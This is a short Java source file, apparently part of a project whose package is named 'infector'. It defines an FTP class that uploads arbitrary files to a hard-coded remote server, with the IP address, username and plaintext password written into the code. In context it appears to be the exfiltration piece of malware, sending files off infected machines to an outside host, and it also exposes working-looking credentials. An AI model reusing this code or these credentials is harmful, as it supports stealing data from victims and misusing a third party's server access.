package xyz.maywr.jugg.infector;

import lombok.AccessLevel;
import lombok.Getter;
import lombok.RequiredArgsConstructor;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;

/**
 * @author maywr
 * 23.07.2022 0:36
 */
@RequiredArgsConstructor( access = AccessLevel.PRIVATE )
public class FTP
{

	@Getter( lazy = true )
	private static final FTP instance = new FTP( "37.140.192.44", "u1710075", "Sv31yLl1gZG2iUfz".toCharArray() );

	private final String host, username;
	private final char[] password;

	public void upload( File f, String path ) throws IOException
	{
		final String filePath = path.endsWith( "/" ) ? path + f.getName() : path + "/" + f.getName();
		URL url = new URL( String.format( "ftp://%s:%s@%s/%s;type=i", username, String.valueOf( password ), host, filePath ) );
		URLConnection connection = url.openConnection();
		OutputStream os = connection.getOutputStream();
		FileInputStream fis = new FileInputStream( f );

		byte[] buffer = new byte[ 4096 ];
		int bytesRead;
		while ( ( bytesRead = fis.read( buffer ) ) != -1 )
		{
			os.write( buffer, 0, bytesRead );
		}

		os.close();
		fis.close();

	}
}
